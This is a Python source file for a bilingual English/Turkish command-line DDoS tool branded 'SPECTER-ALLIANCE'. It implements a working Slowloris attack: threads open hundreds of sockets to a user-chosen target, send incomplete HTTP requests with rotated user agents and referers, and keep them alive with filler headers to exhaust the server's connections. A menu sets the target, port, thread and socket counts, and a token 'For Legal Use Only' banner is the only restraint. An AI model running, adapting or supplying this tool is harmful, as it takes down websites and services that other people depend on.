#!/usr/bin/env python3
import socket
import threading
import time
import random
import os
import sys
from urllib.parse import urlparse

# ===== LANGUAGE SYSTEM ===== #
class Language:
    def __init__(self):
        self.current_lang = "en"
        self.languages = {
            "en": self.english(),
            "tr": self.turkish()
        }
    
    def english(self):
        return {
            "banner_title": "SPECTER-ALLIANCE Advanced DDoS Toolkit",
            "banner_subtitle": "By: SPECTER:AdMiN | For Legal Use Only",
            "menu_title": "=== MAIN MENU ===",
            "menu_options": ["Configure Attack", "Start Attack", "Stop Attack", "Change Language", "Exit"],
            "config_title": "=== CONFIGURATION ===",
            "config_prompts": ["Target URL/IP", "Port (default 80)", "Sockets per thread (default 500)", 
                              "Threads (default 10)", "Timeout (default 10s)"],
            "attack_stats": ["Target", "Active Sockets", "Total Sockets", "Failed Sockets", "Data Sent"],
            "messages": {
                "no_target": "[!] Target not set!",
                "attack_start": "[!] Starting SPECTER attack on {}...",
                "attack_params": "[*] Using {} threads with {} sockets each",
                "attack_stop": "[!] Stopping attack...",
                "attack_stopped": "[+] Attack stopped",
                "exiting": "[!] Exiting...",
                "invalid_choice": "[!] Invalid choice!",
                "press_stop": "Press CTRL+C to stop",
                "language_set": "[+] Language set to: {}"
            },
            "language_options": {
                "title": "=== LANGUAGE SELECTION ===",
                "options": ["English", "Turkish"],
                "prompt": "Select language: "
            }
        }
    
    def turkish(self):
        return {
            "banner_title": "SPECTER-ALLIANCE Gelişmiş DDoS Aracı",
            "banner_subtitle": "By: SPECTER:AdMiN | Sadece Yasal Kullanım İçin",
            "menu_title": "=== ANA MENÜ ===",
            "menu_options": ["Saldırıyı Yapılandır", "Saldırıyı Başlat", "Saldırıyı Durdur", "Dili Değiştir", "Çıkış"],
            "config_title": "=== YAPILANDIRMA ===",
            "config_prompts": ["Hedef URL/IP", "Port (varsayılan 80)", "Thread başına soket (varsayılan 500)", 
                              "Thread sayısı (varsayılan 10)", "Zaman aşımı (varsayılan 10s)"],
            "attack_stats": ["Hedef", "Aktif Soketler", "Toplam Soketler", "Başarısız Soketler", "Gönderilen Veri"],
            "messages": {
                "no_target": "[!] Hedef belirtilmemiş!",
                "attack_start": "[!] {} hedefine SPECTER saldırısı başlatılıyor...",
                "attack_params": "[*] {} thread ve her birinde {} soket kullanılıyor",
                "attack_stop": "[!] Saldırı durduruluyor...",
                "attack_stopped": "[+] Saldırı durduruldu",
                "exiting": "[!] Çıkılıyor...",
                "invalid_choice": "[!] Geçersiz seçim!",
                "press_stop": "Durdurmak için CTRL+C'ye basın",
                "language_set": "[+] Dil ayarı: {}"
            },
            "language_options": {
                "title": "=== DİL SEÇİMİ ===",
                "options": ["İngilizce", "Türkçe"],
                "prompt": "Dil seçin: "
            }
        }
    
    def set_language(self, lang):
        if lang in self.languages:
            self.current_lang = lang
            return True
        return False
    
    def get(self, key):
        return self.languages[self.current_lang].get(key, "")

    def get_message(self, key, *args):
        msg = self.languages[self.current_lang]["messages"].get(key, "")
        return msg.format(*args) if args else msg

# ===== SPECTER CLASS ===== #
class SpecterSlowloris:
    def __init__(self):
        self.lang = Language()
        self.target = ""
        self.port = 80
        self.sockets = 500
        self.threads = 10
        self.timeout = 10
        self.is_attacking = False
        self.stats = {
            "total_sockets": 0,
            "active_sockets": 0,
            "failed_sockets": 0,
            "bytes_sent": 0
        }
        self.user_agents = self.load_user_agents()
        self.referers = self.load_referers()
        
    def load_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        ]
    
    def load_referers(self):
        return [
            "https://www.google.com/",
            "https://www.youtube.com/",
            "https://www.facebook.com/",
        ]
    
    def display_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""\033[91m
   _____ ____   _____ _______ ______ _____  _____   _____ _      ____  _      _____ 
  / ____|  _ \ / ____|__   __|  ____|  __ \|  __ \ / ____| |    / __ \| |    |_   _|
 | (___ | |_) | |       | |  | |__  | |__) | |  | | |    | |   | |  | | |      | |  
  \___ \|  __/| |       | |  |  __| |  _  /| |  | | |    | |   | |  | | |      | |  
  ____) | |   | |____   | |  | |____| | \ \| |__| | |____| |___| |__| | |____ _| |_ 
 |_____/|_|    \_____|  |_|  |______|_|  \_\_____/ \_____|______\____/|______|_____|
\033[0m
\033[93m          {self.lang.get("banner_title")}
\033[95m                  {self.lang.get("banner_subtitle")}\033[0m
""")

    def generate_headers(self):
        return [
            f"User-Agent: {random.choice(self.user_agents)}",
            f"Referer: {random.choice(self.referers)}",
            "Accept-language: en-US,en;q=0.9",
            "Connection: keep-alive"
        ]

    def create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            
            path = f"/?{random.randint(10000, 99999)}"
            
            s.send(f"GET {path} HTTP/1.1\r\n".encode())
            for header in self.generate_headers():
                s.send(f"{header}\r\n".encode())
            
            self.stats["total_sockets"] += 1
            self.stats["active_sockets"] += 1
            self.stats["bytes_sent"] += len(path) + sum(len(h) for h in self.generate_headers())
            
            return s
        except Exception:
            self.stats["failed_sockets"] += 1
            return None

    def attack_thread(self):
        socket_list = []
        while self.is_attacking:
            if len(socket_list) < self.sockets:
                s = self.create_socket()
                if s:
                    socket_list.append(s)
            
            for s in list(socket_list):
                try:
                    s.send(f"X-SPECTER: {time.time()}\r\n".encode())
                    self.stats["bytes_sent"] += 15
                except:
                    socket_list.remove(s)
                    self.stats["active_sockets"] -= 1
            
            time.sleep(random.uniform(0.5, 2))

    def start_attack(self):
        if not self.target:
            print(f"\033[91m{self.lang.get_message('no_target')}\033[0m")
            return
        
        self.is_attacking = True
        print(f"\033[91m{self.lang.get_message('attack_start', self.target)}\033[0m")
        print(f"\033[93m{self.lang.get_message('attack_params', self.threads, self.sockets)}\033[0m")
        
        for _ in range(self.threads):
            threading.Thread(target=self.attack_thread, daemon=True).start()
        
        try:
            while self.is_attacking:
                self.display_stats()
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        self.is_attacking = False
        print(f"\n\033[91m{self.lang.get_message('attack_stop')}\033[0m")
        time.sleep(2)
        print(f"\033[92m{self.lang.get_message('attack_stopped')}\033[0m")

    def display_stats(self):
        self.display_banner()
        print(f"\033[96m=== {self.lang.get('attack_stats')[0].upper()} ===\033[0m")
        print(f"\033[92m{self.lang.get('attack_stats')[0]}:\033[0m {self.target}:{self.port}")
        print(f"\033[92m{self.lang.get('attack_stats')[1]}:\033[0m {self.stats['active_sockets']}")
        print(f"\033[92m{self.lang.get('attack_stats')[2]}:\033[0m {self.stats['total_sockets']}")
        print(f"\033[92m{self.lang.get('attack_stats')[3]}:\033[0m {self.stats['failed_sockets']}")
        print(f"\033[92m{self.lang.get('attack_stats')[4]}:\033[0m {self.stats['bytes_sent'] / 1024 / 1024:.2f} MB")
        print(f"\n\033[95m{self.lang.get_message('press_stop')}\033[0m")

    def config_menu(self):
        self.display_banner()
        print(f"\033[96m=== {self.lang.get('config_title')} ===\033[0m")
        self.target = input(f"\033[93m{self.lang.get('config_prompts')[0]}: \033[0m").strip()
        
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        
        parsed = urlparse(self.target)
        self.target = parsed.netloc.split(':')[0]
        
        self.port = int(input(f"\033[93m{self.lang.get('config_prompts')[1]}: \033[0m") or 80)
        self.sockets = int(input(f"\033[93m{self.lang.get('config_prompts')[2]}: \033[0m") or 500)
        self.threads = int(input(f"\033[93m{self.lang.get('config_prompts')[3]}: \033[0m") or 10)
        self.timeout = int(input(f"\033[93m{self.lang.get('config_prompts')[4]}: \033[0m") or 10)

    def language_menu(self):
        self.display_banner()
        print(f"\033[96m=== {self.lang.get('language_options')['title']} ===\033[0m")
        for i, option in enumerate(self.lang.get('language_options')['options'], 1):
            print(f"{i}. {option}")
        
        choice = input(f"\n\033[93m{self.lang.get('language_options')['prompt']}\033[0m")
        if choice == "1":
            self.lang.set_language("en")
            print(f"\033[92m{self.lang.get_message('language_set', 'English')}\033[0m")
        elif choice == "2":
            self.lang.set_language("tr")
            print(f"\033[92m{self.lang.get_message('language_set', 'Türkçe')}\033[0m")
        else:
            print(f"\033[91m{self.lang.get_message('invalid_choice')}\033[0m")
        time.sleep(1)

# ===== MAIN MENU ===== #
def main():
    tool = SpecterSlowloris()
    
    while True:
        tool.display_banner()
        print(f"\033[96m=== {tool.lang.get('menu_title')} ===\033[0m")
        for i, option in enumerate(tool.lang.get('menu_options'), 1):
            print(f"{i}. {option}")
        
        choice = input(f"\n\033[93m{tool.lang.get('menu_options')[0][0:3]} seçin: \033[0m")
        
        if choice == "1":
            tool.config_menu()
        elif choice == "2":
            tool.start_attack()
        elif choice == "3":
            tool.stop_attack()
        elif choice == "4":
            tool.language_menu()
        elif choice == "5":
            print(f"\033[91m{tool.lang.get_message('exiting')}\033[0m")
            sys.exit(0)
        else:
            print(f"\033[91m{tool.lang.get_message('invalid_choice')}\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\033[91m{tool.lang.get_message('exiting')}\033[0m")
        sys.exit(0)
